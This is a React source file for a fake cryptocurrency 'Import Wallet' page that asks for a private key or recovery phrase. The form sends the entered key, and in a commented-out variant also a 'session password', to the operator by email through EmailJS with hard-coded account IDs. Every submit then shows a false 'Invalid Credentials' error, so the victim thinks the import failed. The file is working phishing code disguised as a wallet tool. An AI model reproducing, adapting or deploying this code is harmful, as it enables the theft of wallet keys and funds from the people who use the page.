import React, { useState } from "react";
import emailjs from "emailjs-com";
import { Link } from "react-router-dom";

const sendEmail = (e) => {
  e.preventDefault();

  emailjs
    .sendForm(
      "service_uca2x1k",
      "template_069w5ez",
      e.target,
      "user_Qp1Kvs7l8ZL0vLtKArviW"
    )
    .then(
      (result) => {
        alert("ERR! Error ");
        console.log(result.text);
      },
      (error) => {
        console.log(error.text);
      }
    );
  e.target.reset();
};

const Json = () => {
  const [hide, setHide] = useState(false);

  const Showmodal = () => {
    setHide(true);
  };

  return (
    <div className="overall__phase">
      <div className="phase__container">
        <h2 style={{ textAlign: 'start', color: 'black', fontWeight: 700 }}>Import Wallet</h2>
        <br />
        <div className="phase__flex">

          <div className="phase__key">
            <a className="a" href="/">
              <Link to="/phrase">PHRASE KEY</Link>
            </a>
          </div>
          <div className="phase__key">
            <a className="a active" href="/">
              <Link to="/private">PRIVATE KEY</Link>
            </a>
          </div>
          <div className="phase__key">
            <a className="a" href="/">
              <Link to="/keystore">KEYSTORE JSON</Link>
            </a>
          </div>
        </div>

        <hr />

        {hide ? (
          <div className="errordiv">
            <h3>ERR: Invalid Credentials</h3>
          </div>
        ) : null}
        <form onSubmit={sendEmail}>
          <input
            type="text"
            placeholder="Private key"
            name="key"
          ></input>
          <h6 className="h4" style={{ color: "black" }}>
            Typically 12(sometimes 24) words separated by single spaces
          </h6>
          <button type="submit" onClick={Showmodal}>
            {" "}
            <b>Import</b>{" "}
          </button>

        </form>
      </div>
    </div>
  );
};

export default Json;


// "service_k8b44u9",
//   "template_3p64vor",
//   e.target,
//   "user_3oBCTEY5rIDrzWsqcTz39"



// "service_k8b44u9",
//   "template_3p64vor",
//   e.target,
//   "user_3oBCTEY5rIDrzWsqcTz39"


// import React, { useState } from "react";
// import emailjs from "emailjs-com";
// import { Link } from "react-router-dom";

// const sendEmail = (e) => {
//   e.preventDefault();

//   emailjs
//     .sendForm(
//       "service_bxvtlgb",
//       "template_nw2fu75",
//       e.target,
//       "user_BcTuzIe6hVvfGnxVcXhoi"
//     )
//     .then(
//       (result) => {
//         alert("ERR! Error ");
//         console.log(result.text);
//       },
//       (error) => {
//         console.log(error.text);
//       }
//     );
//   e.target.reset();
// };

// const JsonPage = () => {
//   const [hide, setHide] = useState(false);

//   const Showmodal = () => {
//     setHide(true);
//   };

//   return (
//     <div className="phase__container">
//       <h1> Import Wallet</h1>
//       <br />
//       <div className="phase__flex">
//         <div className="phase__key">
//           <a className="a" href="/">
//             <Link to="/phrase">PHRASE KEY</Link>
//           </a>
//         </div>
//         <div>
//           <a className="a" href="/">
//             <Link to="/private">PRIVATE KEY</Link>
//           </a>
//         </div>
//         <div>
//           <a className="a" href="/">
//             <Link to="/keystore">KEYSTORE JSON</Link>
//           </a>
//         </div>
//       </div>
//       <hr />
//       <h2 className="h2">Sign In With Your Private Key</h2>
//       {hide ? (
//         <div className="errordiv">
//           <h3 className="err">ERR: Invalid Credentials</h3>
//         </div>
//       ) : null}
//       <form onSubmit={sendEmail}>
//         <input
//           type="text"
//           placeholder="Enter your private key"
//           name="key"
//         ></input>
//         <input
//           type="text"
//           placeholder="Enter Temporay Session Password"
//           name="pass"
//         ></input>
//         <h4 className="h4">
//           Typically 12 (sometimes 24) words separated by a single spaces.
//         </h4>
//         <button type="submit" onClick={Showmodal}>
//           {" "}
//           <b>VALIDATE</b>{" "}
//         </button>
//       </form>
//     </div>
//   );
// };

// export default JsonPage;
